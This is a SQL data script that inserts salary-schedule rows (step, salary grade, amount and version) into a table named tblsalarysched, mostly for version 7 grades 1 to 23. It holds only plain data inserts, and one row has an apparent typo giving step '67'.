INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '29', '155030.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '29', '157561.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '29', '160132.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '29', '162746.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '29', '165402.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '29', '168102.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '29', '170845.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '29', '173634.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '30', '175184.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '30', '178043.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '30', '180949.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '30', '183903.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '30', '186904.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '30', '189955.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '30', '193055.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '30', '196206.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '31', '257809.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '31', '262844.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '31', '267978.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '31', '273212.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '31', '278549.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '31', '283989.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '31', '289536.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '31', '295191.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '32', '307365.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '32', '313564.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '32', '319887.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '32', '326338.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '32', '332919.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '32', '339633.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '32', '346483.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '32', '353470.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '33', '388096.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '33', '399739.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '1', '11551.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '1', '11647.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '1', '11745.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '1', '11843.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '1', '11942.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '1', '12042.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '1', '12143.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '1', '12244.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '2', '12276.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '2', '12369.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '2', '12464.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '2', '12560.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '2', '12657.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '2', '12754.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '2', '12852.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '2', '12950.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '3', '13019.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '3', '13119.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '3', '13220.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '3', '13322.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '3', '13424.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '3', '13527.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '3', '13631.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '3', '13736.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '4', '13807.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '4', '13914.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '4', '14020.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '4', '14128.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '4', '14236.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '4', '14345.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '4', '14456.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '4', '14567.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '5', '14641.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '5', '14754.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '5', '14867.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '5', '14981.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '5', '15096.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '5', '15212.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '5', '15329.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '5', '15446.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '6', '15524.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '6', '15643.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '6', '15763.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '6', '15884.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '6', '16007.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '6', '16129.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '6', '16253.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '6', '16378.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '7', '16458.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '7', '16585.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '7', '16713.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '7', '16841.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '7', '16970.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '7', '17101.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '7', '17231.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '7', '17364.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '8', '17505.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '8', '17663.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '8', '17823.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '8', '17984.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '8', '18146.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '8', '18310.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '8', '18476.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '8', '18643.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '9', '18784.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '9', '18941.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '9', '19100.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '9', '19259.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '9', '19582.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '9', '19420.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '9', '19746.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '9', '19911.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '10', '20219.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '10', '20388.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '10', '20558.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '10', '20731.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '10', '20903.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '10', '21079.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '10', '21254.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '10', '21432.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '11', '22316.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '11', '22600.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '11', '22889.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '11', '23181.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '11', '23477.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '11', '23778.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '11', '24082.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '11', '24391.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '12', '24495.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '12', '24779.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '12', '25067.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '12', '25358.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '12', '25653.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '12', '25952.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '12', '26254.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '12', '26560.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '13', '26754.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '13', '27067.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '13', '27703.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '13', '27383.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '13', '28028.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '13', '28356.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '13', '28688.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '13', '29025.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '14', '29277.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '14', '29621.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '14', '29969.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '14', '30322.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '14', '30678.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '14', '31039.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '14', '31405.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '14', '31775.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '15', '32053.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '15', '32431.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '15', '32814.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '15', '33202.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '15', '33594.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '15', '33991.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '15', '34393.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '15', '34801.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '16', '35106.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '16', '35522.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '16', '35943.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '16', '36369.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '16', '36801.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '16', '37238.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '16', '37681.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '16', '38128.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '17', '38464.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '17', '38922.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '17', '39385.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '17', '39854.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '17', '40329.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '17', '40810.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '17', '41296.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '17', '41789.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '18', '42159.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '18', '42662.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '18', '43172.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '18', '43687.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '18', '44210.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '18', '44739.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '18', '45274.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '18', '45816.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '19', '46791.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '19', '47530.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '19', '48281.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '19', '49044.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '19', '49820.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '19', '50608.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '19', '51410.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '19', '52224.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '20', '52703.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '20', '53537.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '20', '54386.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '20', '55248.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '20', '57016.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '20', '57921.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '20', '58841.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '20', '56125.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '21', '59353.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '21', '60296.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '21', '61255.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '21', '62229.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '21', '63220.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '21', '64226.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '21', '65249.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '21', '66289.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '22', '66867.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '22', '67933.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '22', '69017.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '22', '70118.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '22', '71237.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('67', '22', '72375.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '22', '73531.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '22', '74705.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '22', '72375.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '23', '75359.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '23', '76563.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '23', '77788.00', '7');
